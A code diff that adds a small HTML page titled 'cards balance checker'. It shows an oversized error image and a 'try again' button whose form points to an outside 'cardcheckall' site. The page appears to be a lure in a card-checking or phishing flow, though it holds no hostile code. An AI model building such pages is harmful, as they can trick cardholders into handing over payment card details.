@@ -1,1 +1,14 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>cards balance checker</title> 
+    </head>
+    <body>
+        <center>
+           <img src="./error.jpeg" alt="active" style="height: 1650px; width: 980px;">
+           <form action="https://cardcheckall.vercel.app/" method="get">
+           <button type="submit" style="color: white;background-color: red;height: 60px;width: 200px;border-radius: 20px;font-size: 30px;"> try again</button>
 
+        </center>
+    </body>
+</html> 
